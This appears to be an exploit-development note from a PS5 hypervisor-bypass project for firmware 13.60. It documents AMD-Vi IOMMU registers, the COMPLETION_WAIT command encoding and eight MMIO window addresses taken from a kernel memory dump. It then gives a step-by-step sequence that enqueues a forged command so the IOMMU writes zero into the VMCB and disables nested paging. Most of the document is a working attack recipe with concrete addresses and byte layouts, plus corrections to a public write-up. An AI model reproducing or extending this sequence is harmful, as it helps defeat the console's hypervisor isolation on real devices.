# IOMMU_AUDIT — AMD-Vi IOMMU write primitive (WRITE half of HV-defeat)

**Scope:** fully specify the hypervisor-defeat **IOMMU-write primitive** used by the public
`hv_defeat_0304` method, so a 13.60 payload can enqueue an AMD-Vi **COMPLETION_WAIT** command that
stores **0** to a target physical address (**VMCB + 0x90**). The READ half (NPT walk to dump
hypervisor memory) is a separate lane — out of scope here.

**Sources (all offline):**
- FreeBSD `sys/amd64/vmm/amd/amdvi_hw.c` + `amdvi_priv.h` (the AMD-Vi driver that programs the real
  hardware command buffer / event log / device table / control block). NOTE: these files are **not**
  in the `releng/11.0` checkout (`sys/x86/iommu/` there is **Intel-only**; `sys/dev/iommu/` does not
  exist). They exist on `main`/`stable` branches (`git show main:sys/amd64/vmm/amd/amdvi_hw.c`).
  FreeBSD 11.0 has **no** AMD-Vi/ccp kernel driver — the PS5's IOMMU/TMR code is **Sony-original**,
  but the **register layout and command encoding are fixed by the AMD IOMMU (AMD-Vi) spec**, so the
  FreeBSD AMD-Vi driver is a valid layout oracle.
- FreeBSD `sys/amd64/vmm/amd/vmcb.h` (VMCB control-area offsets).
- AMD I/O Virtualization Technology (IOMMU) Specification Rev 2.0 (register + command semantics).
- `kdata_1360.bin` (15 MB `.data` dump, base `0xffffffffd0930000`) for the 8 MMIO windows.

---

## 1. AMD-Vi MMIO register layout (per `struct amdvi_ctrl`, `amdvi_priv.h`)

The IOMMU is memory-mapped; the control block is **0x4000 = 16 KB** (`AMDVI_MMIO_V1_SIZE = 4×PAGE`)
for v1, 32 KB (`8×PAGE`) for v2 with event counters. `sizeof(struct amdvi_ctrl) == 0x4000` and the
offset CTASSERTs pin the layout. Byte offsets (all from the start of one IOMMU MMIO window):

| MMIO off | register | field layout (bit positions) | what it is |
|---|---|---|---|
| `0x00` | **Device Table Base (DTRB)** | `size[8:0]`, `base[51:12]` | host-PA (4 KB-aligned) of the 256 KB device table |
| `0x08` | **Command Buffer Base (CMDB)** | `base[51:12]`, `len[59:56]` | host-PA (4 KB-aligned) of the command buffer; `len` = log2(entries) |
| `0x10` | **Event Log Base (EVNTB)** | `base[51:12]`, `len[59:56]` | host-PA of the event log |
| `0x18` | **Control (CTRL)** | `EN[0]`, `ELOG[2]`, `ELOGINT[3]`, `COMINT[4]`, `CMD[12]`, `PPRLOG[13]`… | enable bits; `CMD`=command-buffer enable, `EN`=IOMMU enable |
| `0x20` | **Exclusion Range Base** | `enable[0]`, `allow[1]`, `base[51:12]` | exclusion base |
| `0x28` | **Exclusion Range Limit** | `limit[51:12]` | exclusion limit |
| `0x30` | **Extended Feature (EFR)** | — (Rev 2) | feature bits |
| `0x38` | **PPR Log Base** | `base[51:12]`, `len[59:56]` | PPR log base (Rev 2) |
| `0x40` | **Hardware Event (HI)** | — | HW error event addr (upper) |
| `0x48` | **Hardware Event (LO)** | — | HW error event addr (lower) |
| `0x50` | **Hardware Event Status** | — | HW error event status (Rev 2) |
| `0x58 … 0x1FFF` | reserved / Rev-2 event counters | — | — |
| `0x2000` | **Command Buffer Head Pointer** | `[18:0]` (19-bit, byte offset) | HW-owned; advances as HW consumes |
| `0x2008` | **Command Buffer Tail Pointer** | `[18:0]` (19-bit, byte offset) | **SW-owned; writing it triggers command execution** |
| `0x2010` | **Event Log Head Pointer** | `[18:0]` | SW-owned |
| `0x2018` | **Event Log Tail Pointer** | `[18:0]` | HW-owned |
| `0x2020` | **Status** | `EV_OF[0]`, `EV_INTR[1]`, `CMP[2]` | completion-wait/event status |
| `0x2030` | **PPR Log Head Pointer** | `[14:4]` | (Rev 2) |
| `0x2038` | **PPR Log Tail Pointer** | `[14:4]` | (Rev 2) |

CTASSERT anchors (from `amdvi_priv.h`): `pad1 @ 0x58`, `pad2 @ 0x2028`, `pad3 @ 0x2040`,
`sizeof == 0x4000`. This is the stock AMD-Vi v1 MMIO map; the PS5's 8 windows each expose this block.

---

## 2. Command-queue entry format and COMPLETION_WAIT semantics

### 2.1 Entry format (`struct amdvi_cmd`, 16 bytes)

```c
struct amdvi_cmd {                 // byte offset within the 16-byte entry:
    uint32_t  word0;               // +0x0  bits [31:0]
    uint32_t  word1 : 28;          // +0x4  bits [27:0]   (== bits [59:32] of the entry)
    uint8_t   opcode : 4;          // +0x4  bits [31:28]  (== bits [63:60] of the entry)
    uint64_t  addr;                // +0x8  bits [127:64]
} __attribute__((__packed__));
```

**The opcode lives in bits [63:60]** (the high nibble of the *second* 32-bit word). This is the
standard AMD-Vi command opcode field (Linux `CMD_SET_TYPE(cmd,t) = data[1] |= t<<28`).

### 2.2 Command opcodes (`amdvi_priv.h`)

| opcode (bits 63:60) | name | write? |
|---|---|---|
| `0x1` | **COMPLETION_WAIT** (`AMDVI_CMP_WAIT_OPCODE`) | **YES — writes store-data to store-addr** |
| `0x2` | INVALIDATE_DEV_TABLE | no |
| `0x3` | INVALIDATE_IOMMU_PAGES | no |
| `0x4` | INVALIDATE_IOTLB_PAGES | no |
| `0x5` | **INVALIDATE_INTERRUPT_TABLE** (`AMDVI_INVD_INTR_OPCODE`) | **NO** |
| `0x6` | PREFETCH_IOMMU_PAGES | no |
| `0x7` | COMPLETE_PPR_REQUEST | no |
| `0x8` | INVALIDATE_ALL | no |

> **DISCREPANCY (important):** the public `hv_defeat_0304` write-up says "Completion Wait command
> opcode **0x05**". Per the AMD IOMMU spec and both the FreeBSD and Linux AMD-Vi drivers, the
> COMPLETION_WAIT opcode is **0x1**; opcode **0x5 is INVALIDATE_INTERRUPT_TABLE**, which performs
> **no memory write** (it only invalidates interrupt-remap-table entries). The write primitive that
> stores to an arbitrary physical address is **COMPLETION_WAIT (0x1) with the S flag set**. The
> "0x05" in the public write-up is a mislabeled opcode (the hardware write is 0x1); treat 0x1 as
> authoritative.

### 2.3 COMPLETION_WAIT (0x1) field mapping (`amdvi_cmd_cmp()`)

FreeBSD builds it as (for store to `pa` of value `data`):

```c
cmd->opcode = 0x1;                          // bits [63:60]
cmd->word0  = (pa & 0xFFFFFFF8) | 0x1;      // S=1 (bit0), store-addr[31:3] in bits[31:3]
cmd->word1  = (pa >> 32) & 0xFFFFF;         // store-addr[51:32] in bits[19:0]
cmd->addr   = data;                         // 64-bit value written on completion
```

Per AMD IOMMU spec Rev 2.0 (COMPLETION_WAIT):
- `word0` bit 0 = **S** (Store) — when 1, write the store-data; bit 1 = **I** (Interrupt); bit 2 = **F** (Flush).
- `word0[31:3]` + `word1[19:0]` = **StoreAddress[51:0]** — the physical address written. **Must be 8-byte aligned** (bits [2:0] are the flags).
- `addr[63:0]` = **StoreData** — the 64-bit value written to StoreAddress.

So a COMPLETION_WAIT with `S=1` performs an **unchecked 8-byte physical-memory write** of `StoreData`
to `StoreAddress`, executed by the IOMMU engine (which bypasses CPU/HV permission checks — this is
exactly the primitive the public method exploits).

---

## 3. The PS5's 8 IOMMU MMIO windows (13.60)

`kdata_1360.bin` holds 8 unit-context structs in `.data`, one per IOMMU unit. Each unit context:

```
+0x00  IOMMU MMIO window base VA   (device-mapped, READABLE — not XOM)
+0x08  status/flags                (varies per unit)
+0x10  shared root ptr             (0xffffffffcfed1098 — the IOMMU driver root; XOM code)
+0x18  self/.data pointer
```

The 8 window bases (verified from the dump; exactly the 8 values in `[base, base+0x20000)`):

| window idx N | MMIO base VA | unit-context VA (`.data`) |
|---|---|---|
| 0 | `0xffffec8c01130000` | `0xffffffffd173caf8` |
| 1 | `0xffffec8c01134000` | `0xffffffffd173ca58` |
| 2 | `0xffffec8c01138000` | `0xffffffffd173d678` |
| 3 | `0xffffec8c0113c000` | `0xffffffffd173d8c8` |
| 4 | `0xffffec8c01140000` | `0xffffffffd173db38` |
| 5 | `0xffffec8c01144000` | `0xffffffffd173dc68` |
| 6 | `0xffffec8c01148000` | `0xffffffffd173e0b8` |
| 7 | `0xffffec8c0114c000` | `0xffffffffd173e128` |

**Layout:** `window[N].base = 0xffffec8c01130000 + N * 0x4000`, **16 KB stride**. Each window is a
full AMD-Vi control block (§1), i.e. register offsets within window N are
`window[N].base + {0x00, 0x08, 0x10, 0x18, …, 0x2000, 0x2008, 0x2020}`.

**Mapping hypothesis:** 8 windows ↔ 8 IOMMU units on the AMD Oberon APU (Zen2, 8 cores). The
historical VMCB PAs are per-core (`0x6290B000`/`0x62A05000` + `core*0x3000`), so the natural
correspondence is **IOMMU window N ↔ core N** — to zero a given core's VMCB field, enqueue the
COMPLETION_WAIT on window N (or, if the IOMMUs share one command buffer, any unit whose command
buffer we can reach). This 1:1 window↔core mapping is a **hypothesis to confirm on-console** (the
unit-context `+0x08` flags differ: `0x0fffffff00000001`, `0x0000000200000001`, `0x4`, … — likely
unit role/grouping), but the register layout per window is fixed regardless.

**Caveat (from `REGION_ACCESS.md`):** the IOMMU *driver root* `0xffffffffcfed1098` is in the slid
**XOM text** region (`0xffffffffcfed0000` = canonical `0xffffffff80470000`, slide `+0x4FA60000`) —
`kernel_copyout` on it returns −1. The **MMIO windows themselves are device-mapped and readable**;
they are the reachable surface, not the driver root.

---

## 4. Concrete write sequence (WRITE half)

**Goal:** store `0` to `VMCB_PA + 0x90`.

**VMCB + 0x90 target field:** per AMD APM Vol 2 App B and FreeBSD `vmcb.h`,
`VMCB_OFF_NP_ENABLE = VMCB_OFF_CTRL(0x90)` — the **nested-paging-enable (NP_ENABLE) bit (bit 0)**.
Writing 0 clears it, disabling the NPT (SLAT) for the next `VMRUN`. (The public write-up labels
0x90 "VMMCALL intercept" — that label is wrong: the VMMCALL intercept is `intercept[4]` bit 1 at
`VMCB+0x10`. The actual effect of the 0x90 store is to clear NP_ENABLE.)

Prerequisites: kernel R/W (post-KEX) and, per the READ lane, a known `VMCB_PA`.

```
# constants
AMDVI_WIN_BASE = 0xffffec8c01130000          # window 0; window N = + N*0x4000
CORE           = c                            # target core; assume window c <-> core c
WIN            = AMDVI_WIN_BASE + CORE*0x4000
VMCB_PA        = 0x6290B000 + CORE*0x3000     # 3.00-3.21; 0x62A05000 on 4.00-4.51 (13.60: from NPT lane)
TARGET         = VMCB_PA + 0x90               # NP_ENABLE field, 8-byte aligned

# 1. Locate the command buffer for the chosen unit:
#    read CMDB (MMIO 0x08): cmd_base_pa = (CMDB >> 12) & 0xFFFFFFFFFF  (bits 51:12)
#    read CMD_TAIL (MMIO 0x2008): tail = value & 0x7FFFF  (19-bit byte offset)
#    (queue length = 1 << len  entries × 16 bytes; FreeBSD uses len=8 -> 256 entries = 4 KB)
#    If the unit's buffer is not writable, point CMDB at a buffer we control (4 KB-aligned),
#    set len, zero HEAD(0x2000)/TAIL(0x2008), and ensure CTRL(0x18) has CMD(bit12) and EN(bit0) set.

# 2. Build the 16-byte COMPLETION_WAIT entry (little-endian dwords):
d0 = (TARGET & 0xFFFFFFF8) | 0x1                    # S=1; store-addr[31:3]
d1 = 0x10000000 | ((TARGET >> 32) & 0xFFFFF)        # opcode 0x1 in bits[31:28]; store-addr[51:32]
d2 = 0x00000000                                      # store-data low  = 0
d3 = 0x00000000                                      # store-data high = 0
# 16 raw bytes:  d0[3:0] d1[3:0] d2[3:0] d3[3:0]

# 3. Write the 16 bytes into the command buffer at offset = tail (kernel R/W to
#    the guest mapping of cmd_base_pa, or via the DMAP alias DMAP_BASE+cmd_base_pa).

# 4. Ring the doorbell: advance the tail pointer. Writing CMD_TAIL makes the HW
#    execute newly posted commands (AMD spec §3.3; FreeBSD amdvi_update_cmd_tail()).
tail = (tail + 16) % (queue_len_entries * 16)
write64(WIN + 0x2008, tail)

# 5. The IOMMU, after draining prior commands, writes 0 to TARGET (VMCB+0x90),
#    clearing NP_ENABLE.

# 6. Force VMCB reload so the change takes effect (public method step 3):
for each core: vmmcall   # VMEXIT -> HV reloads VMCB -> next VMRUN runs with NPT disabled
```

**Notes / pitfalls:**
- The store address must be **8-byte aligned** — `0x90` (144) is, and VMCB is 4 KB-aligned, so
  `VMCB_PA+0x90` always qualifies.
- The write is a single **8-byte** write (StoreData is 64 bits; value 0 here). To zero more than
  8 bytes, enqueue one COMPLETION_WAIT per 8-byte slot.
- `CTRL` must keep `CMD` (bit 12) and `EN` (bit 0) set, or the command buffer is not serviced.
- Do **not** confuse the opcode: **0x1** = COMPLETION_WAIT. `0x5` (INVALIDATE_INTERRUPT_TABLE)
  performs no memory write — it will not produce the write primitive.

---

## 5. Open items / to reconcile on-console

1. **Opcode label**: public write-up says "0x05"; hardware/AMD-spec/FreeBSD/Linux say COMPLETION_WAIT
   = **0x1**. Confirm the public method's raw 16 bytes if its source is available.
2. **VMCB+0x90 = NP_ENABLE, not "VMMCALL intercept"** (which is `+0x10` bit 1). The 0x90 store
   clears nested-paging enable; confirm the intended effect is NPT disable (consistent with "READ
   half = NPT walk" being performed *before* this write).
3. **window N ↔ core N** is a hypothesis; confirm by reading each window's CMDB/DTEB and matching
   to the per-core VMCB PAs, or by observing which window's COMPLETION_WAIT hits which core's VMCB.
4. 13.60 `VMCB_PA` is unknown offline (HV-private); the historical anchors
   `0x6290B000`/`0x62A05000` + `core*0x3000` fall inside the `0x62xxxxxx` reserved block from the
   `.data` reserved-region map (see `VMCB_DISCOVERY.md`) — expect the 13.60 value in
   `0x60000000..0x70000000`.
